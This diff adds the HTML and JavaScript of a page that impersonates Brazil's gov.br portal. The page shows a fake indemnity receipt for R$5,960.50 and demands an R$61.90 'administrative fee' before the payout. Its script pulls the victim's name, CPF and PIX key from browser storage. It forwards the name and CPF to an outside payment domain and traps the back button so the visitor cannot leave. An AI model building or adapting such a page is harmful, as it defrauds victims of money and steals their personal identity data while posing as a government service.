@@ -1,0 +1,598 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script src="js/tTlLNW0Qrcpd.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "66d288147745dede27dc2965";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
+  <title>Consulta - Finalização</title>
+
+  <!-- Fonte Poppins - Corrigido -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <style>
+    /* Garantir que a fonte Poppins seja aplicada em todos os elementos */
+    * {
+      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+    
+    body {
+      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+    
+    /* Animação de pulse para os ícones de áudio */
+    @keyframes pulse-scale {
+      0%, 100% {
+        transform: scaleY(0.5);
+        opacity: 0.5;
+      }
+      50% {
+        transform: scaleY(1);
+        opacity: 1;
+      }
+    }
+    
+    .animate-pulse-bar {
+      animation: pulse-scale 1.2s ease-in-out infinite;
+    }
+  </style>
+
+  <!-- UTM REPAIR (guarda/repõe query sem recarregar) -->
+  <script>
+    (function () {
+      try {
+        if (location.search && location.search.length > 1) {
+          sessionStorage.setItem("utm_final_qs", location.search);
+        }
+        if (!location.search || location.search.length <= 1) {
+          var saved = (
+            sessionStorage.getItem("utm_final_qs") ||
+            (function(){ try { return new URL(document.referrer).search || "" } catch(e){ return "" } })() ||
+            ""
+          ).replace(/^\?/, "");
+          if (saved) {
+            var cur = new URLSearchParams(location.search);
+            var add = new URLSearchParams(saved);
+            add.forEach(function(v,k){ if(!cur.has(k)) cur.set(k,v); });
+            if (cur.toString()) {
+              history.replaceState(null, "", location.pathname + "?" + cur.toString() + location.hash);
+              console.log("[UTM] finalizacao: query reparada:", cur.toString());
+            }
+          }
+        }
+      } catch(e){ console.warn("[UTM] finalizacao: falha ao reparar query:", e); }
+    })();
+  </script>
+</head>
+
+<body class="w-full overflow-x-hidden">
+  <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+    <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+      <div class="px-4 py-2">
+        <div class="flex justify-between items-center">
+          <div class="flex items-center space-x-3">
+            <img alt="Logo GOV.BR" class="h-6 w-auto" src="images/ZXAfVBq5fWG0.png">
+            <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+            <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+          </div>
+          <div class="flex items-center space-x-3">
+            <div class="flex items-center space-x-1 text-xs text-gray-500">
+              <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="hidden sm:inline">Seguro</span>
+            </div>
+            <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="font-medium" id="nameHeader"></span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="h-8"></div>
+
+    <main class="pt-10 pb-8 px-4">
+      <!-- ====================== STEP 1 ====================== -->
+      <div class="max-w-md mx-auto" id="step1">
+        <div class="mb-6">
+          <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;"></div>
+          </div>
+          <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+        </div>
+
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+          <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+              <svg class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+              <span class="font-bold text-sm">GERANDO COMPROVANTE</span>
+            </div>
+            <p class="text-xs opacity-90">Aguarde enquanto geramos seu comprovante</p>
+          </div>
+
+          <div class="p-6">
+            <div class="text-center">
+              <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-10 h-10 text-green-600 animate-spin" fill="none" viewBox="0 0 24 24">
+                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+              </div>
+              <h2 class="text-xl font-bold text-gray-900 mb-4">Gerando Comprovante</h2>
+              <p class="text-gray-600 mb-6">Estamos preparando seu comprovante de recebimento oficial</p>
+
+              <div class="mb-6">
+                <div class="flex justify-between items-center mb-2">
+                  <span class="text-sm font-medium text-gray-700">Progresso da geração</span>
+                  <span id="percent2" class="text-sm font-medium text-green-600">0%</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-3">
+                  <div id="progress-bar2" class="bg-gradient-to-r from-green-500 to-green-600 h-3 rounded-full transition-all duration-300" style="width: 0%;"></div>
+                </div>
+              </div>
+
+              <div class="space-y-3 text-left">
+                <div class="flex items-center space-x-3">
+                  <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                      <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                  <span class="text-sm text-gray-700">Conectando com servidor governamental</span>
+                </div>
+                <div class="flex items-center space-x-3">
+                  <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                      <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                  <span class="text-sm text-gray-700">Processando dados do usuário</span>
+                </div>
+                <div class="flex items-center space-x-3">
+                  <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                      <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                  <span class="text-sm text-gray-700">Gerando comprovante personalizado</span>
+                </div>
+                <div class="flex items-center space-x-3">
+                  <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                      <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                  <span class="text-sm text-gray-700">Finalizando comprovante</span>
+                </div>
+              </div>
+
+              <div class="bg-blue-50 rounded-xl p-4 mt-6">
+                <div class="flex items-start space-x-3">
+                  <svg class="w-5 h-5 text-blue-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
+                  </svg>
+                  <div>
+                    <h4 class="font-semibold text-blue-800 text-sm mb-1">Comprovante Oficial</h4>
+                    <p class="text-blue-700 text-xs">Este documento é gerado pelo sistema gov.br com sua imagem personalizada e comprova sua solicitação de indenização governamental.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================== STEP 2 ====================== -->
+      <div class="max-w-md mx-auto hidden" id="step2">
+        <div class="mb-6">
+          <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;"></div>
+          </div>
+          <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+        </div>
+
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+          <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm3 1h6v4H7V5zm8 8v2a1 1 0 01-1 1H6a1 1 0 01-1-1v-2h8z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="font-bold text-sm">COMPROVANTE GERADO</span>
+            </div>
+            <p class="text-xs opacity-90">Seu comprovante de recebimento foi gerado</p>
+          </div>
+
+          <div class="p-6">
+            <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-4 mb-6">
+              <h3 class="font-bold text-green-800 mb-3 text-sm">Resumo da Indenização:</h3>
+              <div class="space-y-2 text-sm">
+                <div class="flex justify-between items-center">
+                  <span class="text-green-700">Beneficiário:</span>
+                  <span class="font-medium text-green-900 text-right" id="nameUser14"></span>
+                </div>
+                <div class="flex justify-between items-center">
+                  <span class="text-green-700">CPF:</span>
+                  <span class="font-medium text-green-900" id="cpfUser14"></span>
+                </div>
+                <div class="flex justify-between items-center">
+                  <span class="text-green-700">Chave PIX:</span>
+                  <span class="font-mono text-green-900 text-xs break-all" id="chavePix14"></span>
+                </div>
+                <div class="flex justify-between items-center">
+                  <span class="text-green-700">Tipo:</span>
+                  <span class="font-medium text-green-900" id="tipoPix14"></span>
+                </div>
+                <div class="flex justify-between items-center border-t border-green-300 pt-2 mt-2">
+                  <span class="text-green-700 font-semibold">Valor Total:</span>
+                  <span class="font-bold text-green-900 text-lg">R$ 5.960,50</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="bg-white border-2 border-gray-200 rounded-xl p-4 mb-6">
+              <h4 class="font-semibold text-gray-800 mb-3 text-center">Comprovante Oficial gov.br</h4>
+              <div class="relative" data-comprovante-container="">
+                <div id="comprovanteSkeleton" class="w-full h-64 bg-gray-200 animate-pulse rounded-xl"></div>
+                <img id="comprovanteImg" class="hidden w-full h-auto rounded-lg shadow-sm" alt="Comprovante gerado automaticamente">
+              </div>
+            </div>
+
+            <div class="space-y-3">
+              <button onclick="step2to3()" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
+                <!-- ÍCONE DE PLAY CORRIGIDO -->
+                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                  <path d="M6.3 2.841A1.5 1.5 0 004 4.11V15.89a1.5 1.5 0 002.3 1.269l9.344-5.89a1.5 1.5 0 000-2.538L6.3 2.84z"></path>
+                </svg>
+                <span>OUVIR INSTRUÇÕES FINAIS</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================== STEP 3 ====================== -->
+      <div class="max-w-md mx-auto hidden" id="step3">
+        <div class="mb-6">
+          <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;"></div>
+          </div>
+          <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+        </div>
+
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+          <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+              <!-- ÍCONE DE SPEAKER/ÁUDIO CORRIGIDO -->
+              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                <path d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.707.707L4.586 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.586l3.707-3.707a1 1 0 011.09-.217zM14.657 2.929a1 1 0 011.414 0A9.972 9.972 0 0119 10a9.972 9.972 0 01-2.929 7.071 1 1 0 01-1.414-1.414A7.971 7.971 0 0017 10c0-2.21-.894-4.208-2.343-5.657a1 1 0 010-1.414zm-2.829 2.828a1 1 0 011.415 0A5.983 5.983 0 0115 10a5.984 5.984 0 01-1.757 4.243 1 1 0 01-1.415-1.415A3.984 3.984 0 0013 10a3.983 3.983 0 00-1.172-2.828 1 1 0 010-1.415z"></path>
+              </svg>
+              <span class="font-bold text-sm">INSTRUÇÕES FINAIS</span>
+            </div>
+            <p class="text-xs opacity-90">Ouça as instruções importantes</p>
+          </div>
+
+          <div class="p-6">
+            <div class="text-center">
+              <div class="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <!-- ÍCONE DE PAUSE ANIMADO CORRIGIDO -->
+                <svg class="w-10 h-10 text-blue-600 animate-pulse" fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v4a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                </svg>
+              </div>
+              <h2 class="text-xl font-bold text-gray-900 mb-4">Instruções Finais</h2>
+              <p class="text-gray-600 mb-6">Reproduzindo instruções sobre o próximo passo</p>
+
+              <div class="bg-gray-50 rounded-xl p-6 mb-6">
+                <div class="flex items-center justify-between mb-4">
+                  <div class="flex items-center space-x-2">
+                    <!-- ÍCONE DE SPEAKER PEQUENO CORRIGIDO -->
+                    <svg class="w-5 h-5 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
+                      <path d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.707.707L4.586 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.586l3.707-3.707a1 1 0 011.09-.217zM14.657 2.929a1 1 0 011.414 0A9.972 9.972 0 0119 10a9.972 9.972 0 01-2.929 7.071 1 1 0 01-1.414-1.414A7.971 7.971 0 0017 10c0-2.21-.894-4.208-2.343-5.657a1 1 0 010-1.414zm-2.829 2.828a1 1 0 011.415 0A5.983 5.983 0 0115 10a5.984 5.984 0 01-1.757 4.243 1 1 0 01-1.415-1.415A3.984 3.984 0 0013 10a3.983 3.983 0 00-1.172-2.828 1 1 0 010-1.415z"></path>
+                    </svg>
+                    <span class="text-sm font-medium text-gray-700">Instruções Finais</span>
+                  </div>
+                  <div class="text-sm text-gray-500"><span id="actualTime3">00:00</span> / 0:35</div>
+                </div>
+
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                  <audio id="audio3" src="media/Y07bEAU6YfsZ.mp3"></audio>
+                  <div id="progress-bar-audio3" class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-300" style="width: 0%;"></div>
+                </div>
+              </div>
+
+              <div class="rounded-xl p-4 mb-6 bg-blue-50 border border-blue-200">
+                <div class="flex items-center justify-center space-x-2">
+                  <!-- ÍCONE DE PAUSE NO CÍRCULO CORRIGIDO -->
+                  <svg class="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v4a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                  </svg>
+                  <span class="text-blue-700 text-sm font-medium">🎵 Reproduzindo instruções importantes...</span>
+                </div>
+              </div>
+
+              <div class="bg-amber-50 border border-amber-200 rounded-xl p-4">
+                <div class="flex items-start space-x-3">
+                  <svg class="w-5 h-5 text-amber-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                  </svg>
+                  <div>
+                    <h4 class="font-bold text-amber-800 text-sm mb-1">Atenção!</h4>
+                    <p class="text-amber-700 text-sm">Para finalizar o processo e receber sua indenização, é necessário efetuar o pagamento da taxa administrativa conforme as instruções do áudio.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================== STEP 4 ====================== -->
+      <div class="max-w-md mx-auto hidden" id="step4">
+        <div class="mb-6">
+          <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+            <span class="font-medium">Finalização</span>
+            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">6 de 6</span>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 100%;"></div>
+          </div>
+          <p class="text-xs text-gray-500 text-center">Conclusão do processo</p>
+        </div>
+
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+          <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-orange-600 to-orange-700">
+            <div class="flex items-center justify-center space-x-2 mb-2">
+              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path>
+              </svg>
+              <span class="font-bold text-sm">EFETUAR PAGAMENTO DE R$61,90</span>
+            </div>
+            <p class="text-xs opacity-90">Finalize o processo com o pagamento</p>
+          </div>
+
+          <div class="p-6">
+            <div class="text-center mb-6">
+              <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8 text-orange-600" fill="currentColor" viewBox="0 0 20 20">
+                  <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path>
+                </svg>
+              </div>
+              <h2 class="text-xl font-bold text-gray-900 mb-2">Finalizar Processo</h2>
+              <p class="text-gray-600 text-sm">Efetue o pagamento para concluir sua solicitação de indenização</p>
+            </div>
+
+            <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-6 mb-6 text-center">
+              <h3 class="font-bold text-green-800 mb-2">Valor a Receber</h3>
+              <div class="text-3xl font-bold text-green-600 mb-2">R$ 5.960,50</div>
+              <p class="text-sm text-green-700">Será transferido via PIX após confirmação</p>
+            </div>
+
+            <div class="bg-blue-50 rounded-xl p-4 mb-6">
+              <h4 class="font-semibold text-blue-800 mb-3 text-sm">Processo Finalizado:</h4>
+              <div class="space-y-2 text-sm">
+                <div class="flex items-center space-x-2">
+                  <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                  </svg>
+                  <span class="text-blue-700">Dados verificados e aprovados</span>
+                </div>
+                <div class="flex items-center space-x-2">
+                  <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                  </svg>
+                  <span class="text-blue-700">Chave PIX cadastrada com sucesso</span>
+                </div>
+                <div class="flex items-center space-x-2">
+                  <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                  </svg>
+                  <span class="text-blue-700">Comprovante oficial gerado</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="space-y-4">
+              <button onclick="redirect()" class="w-full font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white">
+                <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                  <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path>
+                </svg>
+                <span>EFETUAR PAGAMENTO</span>
+                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                </svg>
+              </button>
+            </div>
+
+            <div class="bg-gray-50 rounded-xl p-4 mt-6">
+              <div class="flex items-start space-x-3">
+                <svg class="w-5 h-5 text-gray-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+                </svg>
+                <div>
+                  <h4 class="font-semibold text-gray-800 text-sm mb-1">Pagamento Seguro</h4>
+                  <p class="text-gray-600 text-xs">Você será redirecionado para uma plataforma de pagamento segura. Após a confirmação, sua indenização será processada em até 2 horas úteis.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+<script>
+    // ===== BACK REDIRECT =====
+(function() {
+    const redirectUrl = 'liberacao.html';
+    let redirected = false;
+
+    function buildRedirectUrl() {
+        const queryString = window.location.search;
+        return queryString ? redirectUrl + queryString : redirectUrl;
+    }
+
+    // Substitui o estado atual e empurra um novo em cima
+    history.replaceState({ page: 'trap' }, '', window.location.href);
+    history.pushState({ page: 'current' }, '', window.location.href);
+
+    window.addEventListener('popstate', function(event) {
+        if (!redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+
+    window.addEventListener('pageshow', function(event) {
+        if (event.persisted && !redirected) {
+            redirected = true;
+            window.location.replace(buildRedirectUrl());
+        }
+    });
+})();
+// ===== FIM BACK REDIRECT =====
+</script>
+  <script src="js/1SVlB109Jo6r.js"></script>
+  <script>
+    const nameValue = localStorage.getItem("name") || "";
+    const formattedName = nameValue.split(" ")[0];
+    document.getElementById("nameHeader").textContent = formattedName;
+    document.getElementById("nameUser14").textContent = nameValue;
+
+    const cpfValue = localStorage.getItem("cpf") || "";
+    document.getElementById("cpfUser14").textContent = cpfValue;
+
+    const chavePix = localStorage.getItem("chavePix") || "";
+    document.getElementById("chavePix14").textContent = chavePix;
+
+    const tipoPix = localStorage.getItem("tipoPIX") || "";
+    document.getElementById("tipoPix14").textContent = tipoPix;
+
+    (function progress2() {
+      const progressBar2 = document.getElementById("progress-bar2");
+      const percentText = document.getElementById("percent2");
+      let progress2 = 0;
+      const duration = 6000, intervalTime = 60, increment = 100 / (duration / intervalTime);
+      const interval = setInterval(() => {
+        progress2 += increment;
+        if (progress2 >= 100) { progress2 = 100; clearInterval(interval); }
+        if (progressBar2) progressBar2.style.width = `${progress2}%`;
+        if (percentText) percentText.textContent = `${Math.floor(progress2)}%`;
+      }, intervalTime);
+    })();
+
+    setTimeout(() => { step1to2() }, 8000);
+
+    function step1to2() {
+      const step1 = document.getElementById("step1");
+      const step2 = document.getElementById("step2");
+      step1.classList.add("hidden");
+      step2.classList.remove("hidden");
+      // exibe a imagem do comprovante (chama 2x como failsafe)
+      showComprovante();
+      setTimeout(showComprovante, 1000);
+    }
+
+    function step2to3() {
+      const step2 = document.getElementById("step2");
+      const step3 = document.getElementById("step3");
+      step2.classList.add("hidden");
+      step3.classList.remove("hidden");
+      progressAudio3();
+    }
+
+    function progressAudio3() {
+      const audio = document.getElementById("audio3");
+      audio?.play();
+      const progressBarAudio3 = document.getElementById("progress-bar-audio3");
+      let progress = 0;
+      const duration = 35000, intervalTime = 60, increment = 100 / (duration / intervalTime);
+      const interval = setInterval(() => {
+        progress += increment;
+        if (progress >= 100) { progress = 100; clearInterval(interval); }
+        if (progressBarAudio3) progressBarAudio3.style.width = `${progress}%`;
+      }, intervalTime);
+
+      const actualTime3 = document.getElementById("actualTime3");
+      let secondsBy3 = 0, fullduration3 = 35;
+      const timeInterval2 = setInterval(() => {
+        if (secondsBy3 >= fullduration3) { clearInterval(timeInterval2); return; }
+        secondsBy3++;
+        const minutesTime3 = Math.floor(secondsBy3 / 60);
+        const secondsTime3 = secondsBy3 % 60;
+        if (actualTime3) actualTime3.textContent = `${String(minutesTime3).padStart(1,'0')}:${String(secondsTime3).padStart(2,'0')}`;
+      }, 1000);
+
+      setTimeout(() => {
+        const step3 = document.getElementById("step3");
+        const step4 = document.getElementById("step4");
+        step3.classList.add("hidden");
+        step4.classList.remove("hidden");
+      }, 30000);
+    }
+
+    // ====== REDIRECT que preserva UTM ======
+    function redirect() {
+      const cpf  = localStorage.getItem("cpf")  || "";
+      const name = localStorage.getItem("name") || "";
+    
+      const base = "https://pay.consultagov.store/pay/cadastro";
+      const dest = new URL(base);
+    
+      const out = new URLSearchParams(dest.search);
+      out.set("cpf", cpf);
+      out.set("name", name);
+    
+      const carry = new URLSearchParams(
+        (location.search && location.search.length > 1
+          ? location.search
+          : (sessionStorage.getItem("utm_final_qs") || "")
+        ).replace(/^\?/, "")
+      );
+    
+      carry.forEach((v, k) => {
+        if (!out.has(k)) out.set(k, v);
+      });
+    
+      dest.search = out.toString() ? ("?" + out.toString()) : "";
+    
+      // === LOG DE CLIQUE AQUI ===
+      fetch('log.php?tipo=redirect_click').catch(() => {});
+    
+      // === AGUARDA 150ms E REDIRECIONA ===
+      setTimeout(() => {
+        window.location.href = dest.toString();
+      }, 150);
+    }
+  </script>
+
+</body></html>
